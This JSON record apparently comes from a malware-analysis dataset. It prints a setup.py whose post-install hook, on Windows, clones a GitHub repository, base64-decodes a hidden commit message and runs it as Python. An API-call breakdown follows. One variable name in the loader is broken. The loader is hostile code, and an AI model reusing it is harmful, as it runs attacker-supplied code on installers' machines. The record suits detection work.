[
  {
    "pyfile": "setup.py",
    "code_snippet": "import os\nimport sys\nimport base64\nimport shutil\nimport pathlib\nimport subprocess\nfrom setuptools.command.install import install\n\ndef get_temp_directory():\n    temp_dir = os.getenv('TMPDIR') or os.getenv('TEMP') or os.getenv('TMP')\n    if temp_dir:\n        return temp_dir\n    user_profile = os.getenv('USERPROFILE')\n    if user_profile:\n        temp_dir = os.path.join(user_profile, 'AppData', 'Local', 'Temp')\n        if os.path.exists(temp_dir):\n            return temp_dir\n    return '/tmp' if os.name == 'posix' else '.'\n\nclass PostInstall(install):\n    def run(self):\n        install.run(self)\n\n        remote_url = 'https://github.com/isaaknikolaev/PySocks.git'\n        destination_path = pathlib.Path(get_temp_directory()) / 'PySocks'\n\n        if os.name == 'nt':\n            subprocess.call([\"pip\", \"install\", \"dulwich\"])\n\n            from dulwich.porcelain import clone\n\n            # Clone the remote repository\n            repo = clone(remote_url, destination_path)\n\n            # Get the commit at the HEAD of the default branch (e.g., 'master')\n            head_commit = repo[repo.head()]\n            commit_message = head_commit.message.decode('utf-8')\n\n            if c_message.startswith('uJq93k8bmm7KqjL'):\n                clean_message = commit_message.replace('uJq93k8bmm7KqjL', '')\n                process = subprocess.Popen(\n                ['python', \"-c\", base64.b64decode(clean_message).decode('utf-8')],\n                creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,\n                stdout=subprocess.PIPE,\n                stderr=subprocess.PIPE,\n                stdin=subprocess.PIPE\n                )\n\n            # Clean up after finishing\n            shutil.rmtree(destination_path)\n",
    "pattern_analysis": {
      "api_sequence": [
        "os.getenv",
        "os.getenv",
        "os.getenv",
        "os.getenv",
        "os.path.join",
        "os.path.exists",
        "os.name",
        "subprocess.call",
        "dulwich.porcelain.clone",
        "shutil.rmtree"
      ],
      "api_sequence_with_args": [
        "os.getenv('TMPDIR')",
        "os.getenv('TEMP')",
        "os.getenv('TMP')",
        "os.getenv('USERPROFILE')",
        "os.path.join(user_profile, 'AppData', 'Local', 'Temp')",
        "os.path.exists(temp_dir)",
        "os.name",
        "subprocess.call([\"pip\", \"install\", \"dulwich\"])",
        "dulwich.porcelain.clone(remote_url, destination_path)",
        "shutil.rmtree(destination_path)"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.name",
          "id": "get_os_id",
          "description": "Retrieves operating system identifier",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "subprocess.call",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "dulwich.porcelain.clone",
          "id": "clone_git_repo",
          "description": "Clones Git repository to specified local path",
          "first_id": "persistence_stealth",
          "second_id": "persistence_mechanisms",
          "third_id": "persistence_configuration"
        },
        {
          "api_name": "shutil.rmtree",
          "id": "delete_directory",
          "description": "Recursively deletes directory and its contents",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        }
      ],
      "contextual_code": "import os\nimport base64\nimport shutil\nimport pathlib\nimport subprocess\nfrom setuptools.command.install import install\n\ndef get_temp_directory():\n    temp_dir = os.getenv('TMPDIR') or os.getenv('TEMP') or os.getenv('TMP')\n    if temp_dir:\n        return temp_dir\n    user_profile = os.getenv('USERPROFILE')\n    if user_profile:\n        temp_dir = os.path.join(user_profile, 'AppData', 'Local', 'Temp')\n        if os.path.exists(temp_dir):\n            return temp_dir\n    return '/tmp' if os.name == 'posix' else '.'\n\nclass PostInstall(install):\n    def run(self):\n        install.run(self)\n\n        remote_url = 'https://github.com/isaaknikolaev/PySocks.git'\n        destination_path = pathlib.Path(get_temp_directory()) / 'PySocks'\n\n        if os.name == 'nt':\n            subprocess.call([\"pip\", \"install\", \"dulwich\"])\n\n            from dulwich.porcelain import clone\n\n            repo = clone(remote_url, destination_path)\n\n            # ...\n\n            shutil.rmtree(destination_path)\n"
    }
  },
  {
    "metadata": {
      "package_name": "easyhttprequest-2.31.5"
    }
  }
]